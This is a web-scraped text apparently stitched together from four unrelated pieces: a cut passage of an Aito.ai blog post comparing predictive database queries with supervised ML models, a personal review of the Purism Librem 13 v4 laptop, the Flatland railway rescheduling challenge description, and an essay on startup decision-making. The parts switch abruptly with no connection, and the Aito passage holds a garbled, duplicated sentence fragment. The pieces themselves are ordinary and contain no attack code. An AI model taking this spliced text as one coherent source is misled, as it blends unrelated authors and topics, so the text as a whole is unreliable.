solutions exist, that provide such predictive queries. One is the mentioned BayesDB/BayesLite, which creates an in-memory multi-purpose models in a special preparation phase. Another solution is Aito.ai, which does query-time narrow modeling without explicit preparations. Here’s is an example of the Aito workflow:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-queries-in-3-steps.png" alt=""></p></div><p><span>Predictive BayesQL queries in BayesLite. BayesQL is based on SQL and it provides a very elegant way to query arbitrary estimates. This query can be executed after the CREATE POPULATION, CREATE ANALYSIS, INITIALIZE ANALYSIS and ANALYZE operations. </span></p></div><p>We are focusing the following comparisons on Aito. We feel this focus is justified as in Aito we are more familiar with the solution, and it is mature enough to serve the end customers in live production settings. While BayesLite is extremely impressive and their BQL interface and DB/ML integration are worth envy: BayesLite seems to have properties like the 16 minute preparation phase for simple data, which are not consistent with the presented arguments.</p><p>So let’s next dig deeper on the difference in workflow, architecture and quality between the predictive queries and supervised ML models.</p><h2>1. The Workflow</h2><p>The first difference between predictive queries and the traditional supervised models relates to the workflow and the costs.</p><p>Supervised ML models are deployed typically in data science projects, which have several steps like the handover to the data scientist, data preparation, feature engineering, model fitting, deployment, integrations, retraining and monitoring &amp; maintenance. As an addition to this linear progression, you also often have an iteration phase, where the results are improved by refining the data, the preparations, the features, the models, the deployment or the integrations.</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-data-science-project-workflow.png" alt=""></p></div><p><span>A simplified version of the data science project.</span></p></div><p>Taking a supervised model to production may take several weeks or months from one to two persons. This can raise the price point up to hundred thousand euros per model. If you need several models, you need several data science projects, leading to multiplied expenses and delays.</p><p>Now this process changes rather dramatically, if you implement the machine learning functionality with predictive queries. With predictive queries the workflow is in essence the following:</p><ol><li>Prepare the auxiliary <a href="https://aito.ai/blog/introducing-a-new-database-category-the-predictive-database/">predictive database</a> once (if it’s not used as the main database)</li><li>Verify good enough prediction quality with evaluate requests</li><li>Integrate the predictive queries like you would integrate SQL queries</li><li>Write the test/evaluation cases, push these to Git and let the CI handle the regression testing</li><li>If seen as necessary: track the in-production prediction quality with analytics and display the metrics in the product dashboard.</li></ol><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-query-workflow.png" alt=""></p></div><p><span>The workflow with the predictive queries is similar to the workflow with the database queries. Still, because predictive functionality is statistical and its behavior may drift as the data changes: it is advisable to verify the prediction quality (step 2) before implementation and monitor the prediction quality in production (step 5).</span></p></div><p>While putting an auxiliary database (like ElasticSearch) into production can take weeks, the expense related to putting each query into production is closer to the expense of using search/database queries. Often such queries form only a small part of the related functionality’s expense, and often the query based functionality can be implemented in hours and put into production in days.</p><p>This dramatic difference between the workflows and the expenses are explained a) partly by the <a href="https://aito.ai/blog/introducing-a-new-database-category-the-predictive-database/">predictive database</a>’s AutoML capabilities that are accelerated by a specialized database and b) partly by the reduced need for deployments and integrations as the data and the ML are already integrated into a single system. The complex phases of the data science project get systematically eliminated or simplified:</p><ol><li>The handover of the data science project to the data scientist is not needed as the predictive query workflow is easy enough for the software developers.</li><li>Data preparation and feature engineering steps can be greatly eliminated with the ML-database integration. You don’t need to re-prepare and re-upload the data, if the data is already in the database. You don’t need to manually aggregate data into flat data frames, if you can do <a href="https://aito.ai/docs/articles/utilizing-relationships-in-aito/">inference through the database references</a>. You don’t need to manually featurize text either, as the predictive database analyzes the <a href="https://aito.ai/docs/api/#schema-analyzer">text automatically</a> just like ElasticSearch. Last: you don’t need to manage feature redundancies, if the database has built-in <a href="https://aito.ai/blog/introducing-concept-learning-to-free-you-from-feature-engineering/">feature learning capabilities</a>.</li><li>Modeling phase can be automated with a single sophisticated model that provides good enough results for most applications.</li><li>Per model cloud deployment, live integrations and retraining of models simply disappear, because you don’t need to ‘deploy’ or retrain the predictive queries. Instead you integrate one auxiliary predictive database like you would integrate <a href="https://www.elastic.co/">ElasticSearch</a>. If you use the predictive database as your main database, you can omit even that one integration.</li><li>Maintenance is easier, because instead of maintaining deployed infrastructure for each prediction target, you maintain the SQL-like queries like you would maintain code with Git &amp; CI.</li></ol><p>As a consequence, the workflow and the cost of implementing ML via predictive queries is similar to the process of implementing normal business logic via SQL.</p><p>The second difference between the predictive queries and the supervised models is the narrowness and it’s implications on the software architecture.</p><p>Famously: the supervised ML models are <em>narrow</em> in 2 different respects:</p><p>1.Narrowness of the prediction setting. Supervised learning models are essentially narrow functions from A (e.g. text) to B (category), which means that if you have 10 different problems, you end up with with 10 different supervised ML models.
2. Narrowness of the predictive functionality type. A single kind of supervised method can typically serve only one kind of predictions. For this reason you often need completely separate systems or products to implement predictions, recommendations, smart search and pattern mining.d up with with 10 different supervised ML models.</p><p>This combined narrowness has negative implications on the architecture. If you have 10 different predictive functionalities that mix prediction, recommendation and smart search use cases: you end up struggling with a very complex system. The system may include separate supervised model platform with half dozen deployed models, separate recommendation system, a separate smart searching product and separate pattern mining tools. Such complexity is hard to learn, master and …</p></div></div>

            <p>The <a href="https://puri.sm/products/librem-13/">Purism Librem 13</a> is a 13" laptop that's similar to the
Macbook Air but slightly heavier and thicker, from what I
understand. I have the <code>v4</code> means it's the fourth hardware version of
the device. This is the latest incarnation of the <a href="https://anarc.at/hardware/angela/">angela</a>
node.</p>

<p>TL;DR: I recommend people avoid the Purism brand and products. I find
they have questionable politics, operate in a "libre-washing" fashion,
and produce unreliable hardware. Will not buy again.</p>

</ul>


<p>The machine came with a 250GB Crucial SSD drive with PureOS
pre-installed, even if I ordered it without storage.</p>

<h2 id="semi-standard-power-connector"><a name="index1h2"></a>Semi-standard power connector</h2>

<p>The power connector is <a href="https://learn.sparkfun.com/tutorials/connector-basics/power-connectors">somewhat standard</a>: 19V DC on a 5.5mm
sleeve with 2.5 positive pin, with a <a href="https://en.wikipedia.org/wiki/IEC_60320#C5/C6_coupler">C5/C6 cable</a> for the AC side
(as opposed to the more standard C13/C14 coupler, mind you). I was
able to find a "universal 19V adapter" for ~60$ at a local store that
also supported other barrel connectors.</p>

<p>It would be better if the laptop would charge through USB-C,
naturally, as <em>that</em> is slowly becoming the standard for charging
computing devices, but that will have to do for now.</p>

<h2 id="good-monitor"><a name="index2h2"></a>Good monitor</h2>

<p>The monitor shipped with the Librem is actually quite good by my
standards (1920x1080 / 1080p / FullHD). It does mean messing around
with <a href="https://wiki.debian.org/MonitorDPI">HiDPI</a> settings which I haven't quite figured out yet.</p>

<p><a href="https://vincent.bernat.ch/en/blog/2018-4k-hidpi-dual-screen-linux">This post</a> seems to have good resources. From what I understand,
the resolution of the screen is actually 166dpi, which takes some
configuring to display properly. This can be computed from the aspect
ratio (16:9), the resolution (1920x1080) and the diagonal of the
screen (13.3"). According to <a href="https://www.sven.de/dpi/">this calculator</a>, this is the
formula:</p>

<pre><code>Display size: 11.59" × 6.52" = 75.59in² (29.44cm × 16.56cm = 487.64cm²) at 165.63 PPI, 0.1534mm dot pitch, 27434 PPI² 
</code></pre>

<p>All this does make my old monitor (which I found in the basement) look
like crap. So I need to find a <a href="https://forums.puri.sm/t/suitable-external-monitor-for-librem-13/5627">new monitor</a>, arguably not a
problem with the Librem per se of course...</p>

<p>It seems the Librem can drive 1440p, so not "4K UHD" (3840x2160), but
"QHD" (2560x1440) which should be more than enough.</p>

<h2 id="liberated-boot"><a name="index3h2"></a>Liberated boot</h2>

<p>The Purism folks did a pretty awesome job at liberating their
BIOS. They run their own version of coreboot they call
<a href="https://docs.puri.sm/PureBoot.html">Pureboot</a>. In theory, it should be easier to setup a trusted,
<a href="http://wiki.debian.org/SecureBoot">SecureBoot</a> but in practice I have yet to set that up.</p>

<p>I did try to configure the laptop with an encrypted <code>/boot</code>, but that
didn't go so well. First, I get a double password prompt: once in
<code>grub</code> and once in the <code>initramfs</code>. But more annoying is the <code>grub</code>
prompt has no retry: if you fail, you drop in the rescue shell which
is really impractical.</p>

<p>(Update: that is, of course, not specific to Purism or PureOS, but a
limitation in grub itself.)</p>

<p>Finally, Pureboot doesn't support encrypted <code>/boot</code> so it actually
makes it <em>harder</em> to implement trusted boot.</p>

<p>The coreboot stuff needs to be updated, and instructions are available
<a href="https://puri.sm/coreboot/">on the Purism website</a>.</p>

<h2 id="excellent-linux-support"><a name="index4h2"></a>Excellent Linux support</h2>

<p>On top of the liberated BIOS, it must be said the device has
<em>excellent</em> support for free operating systems. <em>Every</em> device on the
machine has full support in the Linux kernel, even the "older" version
in Debian stretch (Linux 4.9). No binary blobs, no proprietary
drivers, even for wifi.</p>

<p>That is just awesome. It's the first device, in a long time, that
gives me this freedom, so it should be acknowledged and celebrated.</p>

<p>Update: I still have some <code>non-free</code> packages installed:</p>

<ul>
<li><p>the Intel CPU firmware package (<a href="http://packages.debian.org/intel%2Dmicrocode">intel-microcode</a>)</p></li>
<li><p>I also use some "non-free" documentation packages (<a href="http://packages.debian.org/doc%2Drfc">doc-rfc</a>, <a href="http://packages.debian.org/emacs%2Dcommon%2Dnon%2Ddfsg">emacs-common-non-dfsg</a>, <a href="http://packages.debian.org/make%2Ddoc">make-doc</a>)</p></li>
<li><p>Bluetooth requires <a href="http://packages.debian.org/firmware%2Datheros">firmware-atheros</a></p></li>
</ul>


<p>When building the <code>initramfs</code>, there are warnings about the <code>i915</code>
graphics controller, which is solved by installing the <a href="http://packages.debian.org/firmware%2Dmisc%2Dnonfree">firmware-misc-nonfree</a> package, but the graphics card works without
the firmware. Apparently, the warnings are harmless and indeed PureOS
fixed <a href="https://tracker.pureos.net/T362">the bug</a> by simply <a href="https://source.puri.sm/pureos/core/initramfs-tools/commit/005ca5b834fa7ee44bb913d74b4ff2aa542fc9d1">disabling all such warnings</a>.3</p>

<p>The Debian-specific stuff is also documented in <a href="https://wiki.debian.org/InstallingDebianOn/Purism/Librem%2013">the Debian wiki</a>.</p>

<h2 id="good-speakers"><a name="index5h2"></a>Good speakers</h2>

<p>The builtin speakers sound great.</p>



<p>I have a few issues with the device.</p>

<h2 id="weird-keyboard-layout"><a name="index6h2"></a>Weird keyboard layout</h2>

<p>The <a href="https://forums.puri.sm/t/keyboard-layout-unable-to-recognize-pipe/2022">keyboard layout is strange</a>: the key above <kbd>enter</kbd>,
instead of sending <kbd>\</kbd> or <kbd>|</kbd>, sends
"chevrons". This is due to the Purism folks expecting you to pick the
"US international" keyboard instead of the "US" keyboard, which is a
very strange pick, as the "US" keyboard seems pretty standard. The
workaround is to drop this in your <code>udev</code> configuration, say in
<code>/etc/udev/hwdb.d/90-purism-pipe-symbol-fix.hwdb</code>:</p>

<pre><code>evdev:atkbd:dmi:bvn*:bvr*:bd*:svnPurism:pnLibrem13v4*
 KEYBOARD_KEY_56=backslash
</code></pre>

<p>Then running:</p>

<pre><code>sudo systemd-hwdb update
sudo udevadm trigger
</code></pre>

<p>The keyboard layout, in general, is a little unique: the sound buttons
are split across the <kbd>F4</kbd> key (mute) and
<kbd>-</kbd>/<kbd>=</kbd> (volume up/down keys) for some reason.</p>

<p>The <kbd>PrtSc</kbd> key <a href="https://forums.puri.sm/t/does-alt-sysrq-work-on-librem-laptops/5290/9">can be as SysRq</a> but is <em>backwards</em>
(<kbd>ScrLk</kbd> <kbd>PrtSc</kbd>) to their usual order
(<kbd>PrtSc</kbd> <kbd>ScrLk</kbd>).</p>

<h2 id="limited-usb-c-port"><a name="index7h2"></a>Limited USB-C port</h2>

<p>The USB-C port <a href="https://forums.puri.sm/t/is-hdmi-over-usb-c-possible-on-13v2/2020">does not support video</a> which makes it limited to
charging and data transfer. It can also not charge the laptop itself,
as there's a separate power connector, losing many of the benefits
usually associated with USB-C.</p>

<p>Ideally, a USB-C port might be used as a universal docking port: one
wire to plug and you have power, video, audio, and USB for keyboard
and mouse. Unfortunately, I'm still stuck with about 4 wires to plugin
when I come into the office, something I was hoping to avoid. People
have <a href="https://forums.puri.sm/t/please-recommend-a-port-replicator-docking-station/1115">looked for a dock station</a> without success.</p>

<h2 id="shipping-delays-doa"><a name="index8h2"></a>Shipping delays, DOA</h2>

<p>I waited almost four weeks to have my laptop delivered. Presumably
this was due to a <a href="https://forums.puri.sm/t/where-was-purism-moving/5799/">warehouse move</a> but I found that communication
about the issue could have been better. Worse: the laptop was <a href="https://forums.puri.sm/t/librem-13v3-bricked/5714/19?u=anarcat">dead on
arrival</a> (DOA) so I had to return it, adding another week delay for
getting an actual working laptop. FedEx even charged me for the return
even though Purism actually issued a shipping label, something I still
haven't quite resolved.</p>

<p>Update: I ended up paying over 260$ in shipping fees to Fedex, in the
end. I first paid around 70$ for the first laptop sent, then Fedex
sent me <em>another</em> 200$ bill for the <em>second</em> laptop. Purism were
unable to help me with this issue and Fedex has been totally useless
as well. I've tried to reach to both organizations to get around those
fees but the time wasted waiting on hold and support has outgrown the
possible savings I could to by not paying the damn bill, so I just
paid it now.</p>

<h2 id="bright-leds-not-accessible-when-lid-closed"><a name="index9h2"></a>Bright LEDs, not accessible when lid closed</h2>

<p>There are three leds on the top right of the keyboard: one for wifi,
battery and power. They are very bright and even though they can
technically be dimmed, the firmware is not open so there's <a href="https://forums.puri.sm/t/is-there-a-way-to-dim-the-leds-on-the-13-v2/1172">no way to
dim the LEDs</a>.</p>

<h2 id="no-ethernet-port"><a name="index10h2"></a>No ethernet port</h2>

<p>That was a deal breaker for me originally, but I changed my
mind. First, I don't need gigabit transfer speeds that often. Then my
office doesn't have wired connectivity yet, so it is not that
useful. Plus, I can afford to have a USB dongle there with a gigabit
ethernet port, indeed, I already have one of those USB hubs. So not
that big of a deal.</p>

<h2 id="libre-washing"><a name="index11h2"></a>Libre-washing</h2>

<p>I have found Purism's commitment to free hardware and free software to
be questionable. While, yes, they try to provide a <a href="#liberated-boot">liberated boot</a>
and coreboot-based BIOS, that BIOS is not free software. At best they
"neuter" the Intel Management Engine, but you still require non-free
firmware to operate a Librem Computer, from the CPU down to the
Bluetooth and Wifi hardware. Even if that is a very common pattern on
laptops and phone, it is a huge disconnect with the "purity" and
"freedom" narrative on their website.</p>

<p>For example, the replacement for the Librem 13, called Librem 14,
claims to be:</p>

<blockquote><p><strong>The first 14″ laptop designed to protect your digital life</strong></p>

<p>Ultra-portable workstation laptop that was designed chip-by-chip,
line-by-line, to respect your rights to privacy, security, and
freedom.</p></blockquote>

<p>Yet it still ships with Intel processors, known for a large variety of
fundamental security issues that are part of the hardware design,
which Intel refuses to fix. That it ships <a href="https://puri.sm/coreboot/">coreboot</a> on top of that
is besides the point: coreboot, as shipped by Purism, is not open
source, or at least ships proprietary blobs.</p>

<p>Compare this with the work System76 has been doing in recent
times. While they brand themselves as just a company shipping Linux
laptops, they <a href="https://blog.system76.com/post/187072707563/the-new-firmware-manager-updating-firmware-across">work with the de-facto standard LVFS</a> (even though
that is a <a href="https://blog.system76.com/post/173801677358/system76-and-lvfs-what-really-happened">bumpy ride</a>), actually <a href="https://blog.system76.com/post/612315972866637824/a-look-back-at-manufacturing">design and prototype their own
hardware</a>, and <a href="https://opensource.com/article/20/1/system76-open-source-firmware">liberated their keyboard microcontroller</a>. They
have even started <a href="https://blog.system76.com/post/186655523269/open-firmware-and-more-news-from-july">working on an open Thunderbolt
microcontroller</a>. And while those might sound like small things
compared to liberating the CPU firmware, I will point out that they
actually <em>succeed</em> in completely liberating those components, while
Purism, in the <em>years</em> they have supposedly been working on those
projects, have only managed to reuse (and, to be fair, improve on) the
work <em>others</em> have done to neutralize the IME.</p>

<p>What has Purism done, in the meantime? Neutralized IME. That's
it. They have not published <em>anything</em> on LVFS. Even closed-source
companies like <a href="https://fwupd.org/lvfs/vendors/#logitech">Logitech</a>, <a href="https://fwupd.org/lvfs/vendors/#synaptics">Synaptics</a>, <a href="https://fwupd.org/lvfs/vendors/#hp-ws">HP</a> and <a href="https://fwupd.org/lvfs/vendors/#dell">Dell</a>
ship their updates on LVFS. Purism <a href="https://fwupd.org/lvfs/vendors/#purism">has a test account</a> and work
has been <a href="https://forums.puri.sm/t/submit-firmware-to-linux-vendor-firmware-service-lvfs-for-easy-updating/4731">stalled for years now</a>.</p>

<figure><img alt="flatland_logo" src="https://s3.eu-central-1.amazonaws.com/aicrowd-static/SBB/images/Flatland_Logo.svg"></figure>

<p><strong>The key question we want to answer here is: How can trains learn to automatically coordinate among themselves, so that there are minimal delays in large train networks ?</strong></p>

<h2>Abstract</h2>

<p><i>The Flatland Challenge is a competition to foster progress in multi-agent reinforcement learning for any </i><a href="https://en.wikipedia.org/wiki/Vehicle_rescheduling_problem"><i>re-scheduling problem (RSP)</i></a><i>. The challenge addresses a real-world problem faced by many transportation and logistics companies around the world (such as the Swiss Federal Railways, SBB. Different tasks related to RSP on a simplified 2D multi-agent railway simulation must be solved. Your contribution may shape the way modern traffic management systems (TMS) are implemented not only in railway but also in other areas of transportation and logistics. This will be the first of a series of challenges related to re-scheduling and complex transportation systems.</i></p>

<h2>Background</h2>

<p>The Swiss Federal Railways (SBB) operate the densest mixed railway traffic in the world. SBB maintain and operate the biggest railway infrastructure in Switzerland. Today, there are more than 10,000 trains running each day, being routed over 13,000 switches and controlled by more than 32,000 signals. Each day 1.2 million passengers and almost half of Switzerland’s volume of transported goods are transported on this railway network. Due to the growing demand for mobility, SBB needs to increase the transportation capacity of the network by approximately 30% in the future.</p>

<p>The increase in transport capacity can be achieved through different measures, such as <a href="https://smartrail40.ch/index.asp?inc=&amp;lang=en">denser train schedules, investments in new infrastructure, and/or investments in new rolling stock</a>. However, SBB currently lack suitable technologies and tools to quantitatively assess these different measures.</p>

<p>A promising solution to this dilemma is a complete railway simulation that efficiently evaluates the consequences of infrastructure changes or schedule adaptations for network stability and traffic flow. A complete railway simulation consists of a full dynamical physics simulation as well as an automated traffic management system.</p>

<figure><img alt="flatland_visual" src="https://s3.eu-central-1.amazonaws.com/aicrowd-static/SBB/images/Flatland_Preview.svg"></figure>

<p><i><strong>Flatland</strong>: This image illustrates an early draft of the environment visualization. The core task of this challenge is to manage and maintain railway traffic on complex scenarios in complex networks.</i></p>

<p>The research group at SBB has developed a high-performance simulator which simulates the dynamics of train traffic as well as the railway infrastructure. Different approaches for <a href="https://on-demand-gtc.gputechconf.com/gtcnew/on-demand-gtc.php?searchByKeyword=erik%20nygren&amp;searchItems=&amp;sessionTopic=&amp;sessionEvent=&amp;sessionYear=&amp;sessionFormat=&amp;submit=&amp;select=">automated traffic management systems (TMS)</a> are currently under investigation. The role of the traffic management system is to select routes for all trains and decide on their priorities at switches in order to optimize traffic flow across the network.</p>

<p>At the core of this challenge lies the general vehicle re-scheduling problem (VRSP) proposed by Li, Mirchandani and Borenstein in 2007:</p>

<blockquote>
<p>The vehicle rescheduling problem (VRSP) arises when a previously assigned trip is disrupted. A traffic accident, a medical emergency, or a breakdown of a vehicle are examples of possible disruptions that demand the rescheduling of vehicle trips. The VRSP can be approached as a dynamic version of the classical vehicle scheduling problem (VSP) where assignments are generated dynamically.</p>
</blockquote>

<p>The “Flatland” Competition aims to address the vehicle rescheduling problem by providing a simplistic grid world environment and allowing for diverse solution approaches. The challenge is open to any methodological approach, e.g. from the domain of reinforcement learning or of operations research.</p>

<p>The problems are formulated as a 2D grid environment with restricted transitions between neighboring cells to represent railway networks. On the 2D grid, multiple agents with different objectives must collaborate to maximize global reward. There is a range of tasks with increasing difficulty that need to be solved as explained in the coming sections.</p>

<h2>Tasks</h2>

<p>The challenge requires your creativity and savviness. In 3 submission rounds with increasing difficulty, you can prove that you have what it takes. We invite you to enter the race with your unique solution and to win great prizes - at the same time solving one of the key challenges in the world of transportation!</p>

<p>Here is a teaser of what we expect you to do:&nbsp;</p>

<figure><img alt="Teaser" src="https://i.imgur.com/9cNtWjs.gif"></figure>

<p>Your overall goal is to make all agents (trains) arrive at their target destination with a minimal travel time. In other words, we want to minimize the time steps (or wait time) that it takes for each agent in the group to reach its destination.</p>

<p>Let’s say in a scenario with n-agents, the travel time is measured by the collected amount of timesteps all the agents have until the n-th agent arrives at its destination.</p>

<h3>1. Can you design the best-performing agent?</h3>

<p>Design the best-performing agent. At the more basic levels, the agents may achieve their goals using ad-hoc decisions. But as difficulty increases from round to round, the agents have to be able to plan ahead, i.e. with increasing difficulty, planning becomes more relevant!</p>

<h3>2. Can you design the best observation?</h3>

<p>As a participant, you have the choice. You can either work with the three base observations that we prepared or better, design an improved observation yourself. If you do the latter, then share your observation and you will have chances of winning the Community Contribution Prize (see Prizes). These are the three base observation that we prepared:</p>

<p>Global Observation: The whole scene is observed</p>

<p>Local Grid Observation: A local grid around the agent is observed</p>

<p>Tree Observation: The agent can observe its navigable path to some predefined depth.</p>

<p>Sounds complicated? Do not despair, the next sections will provide you with more useful information about these rounds!</p>

<h2>Timeline</h2>

<p>There will be 3 rounds in the challenge. The first one (round 0) is a beta round and serves as an introduction to get familiar with Flatland (as well as bug fixing). Rounds 1 and 2 pose the actual problems to be solved. Submissions are only accepted for Round 1 and Round 2, both rounds will contribute to the final ranking. <strong>Round 2 is currently ongoing and will close on Sunday, 5th of January 2020, 12 PM, UTC +1.</strong></p>

<h3>Round 0: Learn to navigate (Beta Round)</h3>

<p>A single agent has to navigate from a freely chosen starting point to a freely chosen target destination on a random infrastructure. It is, in other words, a relatively simple shortest path problem.</p>

<p>There will be no uploading possibility, no ranking, nor any prizes to be gained in this round - but the collected insights make it all worth it!</p>

<p>Check out this simple <a href="https://gitlab.aicrowd.com/flatland/baselines/blob/master/torch_training/Getting_Started_Training.md">introduction to training</a> to get started with your own training on Flatland.</p>

<p><strong>The beta round starts on the 1st of July 2019 and ends on the 30th of July 2019</strong></p>

<figure><img alt="Round0" src="https://i.imgur.com/t5ULr4L.gif"></figure>

<h3>Round 1: Avoid conflicts</h3>

<p>We pick-up the same problem from the previous round and turn it into a multi-agent problem. This means, multiple agents have to find their ways to their respective target destinations. In this scenario you are likely to encounter resource conflicts when two or more agents simultaneously plan to occupy the same section of infrastructure. Thus, the agents have to learn to avoid conflicts and find feasible solutions. By timely submitting your solution and adhering to the <a href="#rules">participation rules</a> you are automatically eligible for the <a href="#prizes">Contribution Prize &amp; Best Agent Prize</a>. Good luck!</p>

<p><strong>Round 1 will open on Tuesday, 30th of July and close on Sunday, 13th of October 2019, 12 PM, UTC +1.</strong> <strong>Round 1 submissions closed early in order to start with Round 2 as early as possible.</strong> <strong>If you still want to test your code on earlier version please get in touch with us directly.</strong></p>

<figure><img alt="Round1" src="https://i.imgur.com/AvBHKaD.gif"></figure>

<p><strong>Round 2: Optimize train traffic</strong>: In reality, not all trains can go at the same speed. In round 2 we introduce additional complexity to the multi-agent-problem of round 1 by letting the trains have different speeds! Furthermore, stochastic events will occur during the episodes which mean that your controller will need to adapt to a changing environment. Key features of the updated environment are:</p>

<ul>
	<li>Agents travel at 4 different speeds.</li>
	<li>Some agents will experience malfunctions which render them immobile at times.</li>
	<li>Agents have to actively start their journey in the environment and leave the environment when they reach their target.</li>
</ul>

<p>This means that a good solution not only avoids/resolves conflicts, but also optimizes by taking into account that slower agents can slow down the faster ones. The prize is reserved for the winner who submits the solution with the minimal cumulated travel time for all agent. By submitting your solution timely and adhering to the <a href="#rules">participation rules</a>, you are automatically eligible for the <a href="#prizes">Contribution Prize &amp; Best Agent Prize</a>. Good luck!</p>

<figure><img alt="Round2" src="https://i.imgur.com/Pc9aH4P.gif"></figure>

<p><strong>Round 2 is now open and will close on Sunday, 5th of January 2020, 12 PM, UTC +1.</strong></p>

<h2>Environment</h2>

<p>There are a few important basic elements and notions specific to this challenge that you should be aware of before diving into the “Lets get started” section.</p>

<h3>Agent</h3>

<p>Flatland is a discrete time simulation, that means that all actions performed happen with a constant time step. At each step, the agents can choose an action. The term agent is defined as an entity that can move within the grid and must solve tasks - these agents are, who would have thought, trains. A train does basically two things: wait or go into a particular direction. Depending on the train type (e.g. freight train or passenger train), they have different speeds. An agent can move in any arbitrary direction (if the environment permits it) and transition from one cell to the next. If the agent chooses a valid action, the corresponding transition will be executed and the agent’s position and orientation is updated. Each agent has its individual start and target.</p>

<p>Agent at start:</p>

<p>Target Destination:</p>

<p>The cell where the agent is located at must have enough capacity to hold …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>When I was joining a startup with plans to replace the CTO, there was a relaunch going on. I’ve talked to people and no one seemed happy. Developers were unhappy and helpless and the founders were also unhappy with the relaunch. I’ve heard it had being going on since months. The whole company couldn’t understand why tech didn’t deliver. Digging deeper I found over 150 open bugs in a small team, a founder who changed the design every week and a product manager sandwiched between the unhappy founder and the unhappy developers. I forced the founder to make a lasting decision, we fixed or closed all of the bugs and delivered a new website. The founder team, developers and I were happy, not to speak of the product manager.</p><p>Developers are trapped in a cycle of bad decision making in startups. Companies are bad at making decisions. Founders and executives treat decisions as a way to show leadership, the woman or man at the helm being able to decide about the future of the company. Creative visionaries come up with new ideas and decisions to build new products every day, changing direction on a whim in the chase for customers and investor satisfaction. Developers bear the brunt. They believe a process around decisions in startups and companies is not of their concern. They only need to execute. Tell me what I should code. </p><p>I hear from founders and CEOs who want to speed up development because they have the perception technology is slow. With the abundance of knowledge on processes, lean development and of-the-shelf technology this is unlikely. The perception of development being slow is the impact of a bad decision process in startups. For development the negative consequences are time pressure, constantly changing requirements, ongoing reprioritizations and therefor even more pressure and blame. </p><p>We will investigate why decision making is broken, what consequences this has for developers and CTOs and how to fix it.</p><p>0.</p><p><em>“Our research shows that the difference between leaders who make good decisions and those who make bad ones is striking. The former recognize that all decisions are processes, and they explicitly design and manage them as such.” </em><br>David A. Garvin and Michael A. Roberto in HBR</p><p>To many people decision making is an event, while decision making is a process. This perception causes several bad side effects. The most important one is that their decision has not the intended effects. Founders wonder why after taking a decision, the company does not change. Why after taking a decision they get a lot of discussion instead of people executing their decision towards success.</p><p>‍</p></div><div><p>How does one change this? How would a decision process look if done right? </p><p>The four steps of a decision process are:</p><ol start="" role="list"><li>Prepare</li><li>Make</li><li>Rollout</li><li>Enforce</li></ol><p>Let us look into each phase in more detail. I’ll show how mistakes in all four phases have impact on software developers and CTOs.</p><p>1.</p><p>The first phase is ‘prepare a decision’. Preparing a decision means getting the facts and information that are needed to make a decision. It also means getting feedback and the mood from stakeholders about the decision. If you surprise people with a decision, you have done it wrong. If as a founder you want to make a decision, ask your management team before what they think about it. First in a team meeting and then in one-on-one discussions with your managers. Get the buy-in from everyone that a decision needs to be made. Make sure everyone knows if the decision is to be a team decision or something a founder or managers decides.</p><p>Without the right preparation, managers make wrong assumptions, miss key parts of the decisions or do not think about consequences. Bad preparation leads to features in development that take too long, are too complicated, hard to maintain or not worth the effort. If a decision has large infrastructure impacts, feature implementation will take a long time. Cost and time pressure is put on the CTO because of badly prepared decisions.</p><p>2.</p><p>The second phase is ‘making the decision’. When you have the buy-in from everyone and all the information you need, it is time to decide. Decisions with consequences are hard to make with all the options on the table. For this managers postpone decisions to not lose options and commit themselves. If you have all the information and you have the feedback from people, make the decision and do not delay it. Break the pattern to move the decision to next week’s management meeting because of the desire to not constrain yourself. Make the decision as fast and as early as possible despite the fear of making the wrong one. A mistake I often see around making decisions: it is unclear on how decisions are made and who makes them. Introducing a decision framework like RACI helps here. It defines roles people have:</p><ul role="list"><li>R = Responsible: The person or people to successfully execute the decision</li><li>A = Accountable: The person or people who make the decision</li><li>C = Consulted: People who are asked for input to the decision</li><li>I = Informed: People informed about the decision</li></ul><p>This way roles are clear, and it is clear who makes a decision e.g. the CEO, CTO, Head of Product or the group. Otherwise people often confuse their role of giving input and with making a decision.<br>Not making a decision has bad consequences for development and CTOs. All the time lost prolonging the decision is put on development as pressure to speed up development. Donald G. Reinertsen shows in “Developing Products in Half the Time” that half of the time to market is lost in the “fuzzy frontend” before development even starts. If I consult a company, I tell people it is hard to cut 10% out of development time with already agile and lean development departments, but it is easy to cut 50% out of pre-development time. Every second after an idea is found in a company is as precious as a second in the last week before launch. People treat these differently though. Time in the decision making phase is treated as an unlimited resource and time in crunch mode before release is treated as gold. The most urgent job for a CTO is to have a decision process in place and force fast decisions to make his life happier. It helps to write down the dates of when an idea is new and when development starts to optimize lead times.</p><p>3.</p><p>While some people are at least able to make timely decisions, they fail miserably at rolling them out. Decisions are made, decisions are communicated by email or in all-hands meetings and decision makers expect the course of the company to change. They do not understand that after making a decision the most important next step is rolling it out. Every important decision involves change management. Rolling out a decision means communicating the decision, explain the decision, explain why alternatives have not been chosen, explain what the decision means for the company, departments and employees. Transparency about the decision, the reasons that the decision was made the way it went is paramount to success. Every decision needs to be explained in one-on-ones to make it stick, let people vent their feelings, get feedback and the buy-in from those carrying it out. Proclaiming you have decided something will not make the decision stick and will result in a disaster. The company ignores your decision and just carries on. Founders feel frustrated and react with pressure on execution. </p><p>When not rolling out a decision and explaining the circumstances, people have different perceptions about it, how to interpret it, what it means for them, the state of the company, what is important and what to focus on. This creates increased friction all over the company. As development needs to work with many parts of the company, it is highly impacted by high friction and differing &nbsp;assumptions and perceptions. If a company has a decision process with good rollout practices friction is minimized and development speed is increased. High friction leads to low development speed which is blamed on developers and CTOs. </p><p>4.</p><p>The last phase of decision making is enforcement. There are many people who will not be happy with your decision.</p><p><em>"Surely a decision is a decision?" "Only if it's the decision you want. If not, it's just a temporary setback." Sir Humphery, Yes Minister.</em></p><p>They will ignore it or try to reopen it. There are many ways to do so. Managers will sabotage decisions if they don’t like them and you don’t act. They agree with the decision but do not carry it out. After a decision has been made in a meeting, next week people will claim “This is not the way how I have perceived this. We haven’t made a clear decision.” People act just as if you haven’t made a decision at all. </p><p>After making a decision and rolled it out, it’s time to enforce it. Every decision has to be recorded in meeting notes or in other forms to make it clear to everyone that a decision has been made, how the decision looks and misunderstandings are reduced. Without writing it down people will leave a meeting and everyone has a different understanding and takeaway. If people show tendencies to counteract your decision, bring them back on the right path. Explain the decision again. Then explain it 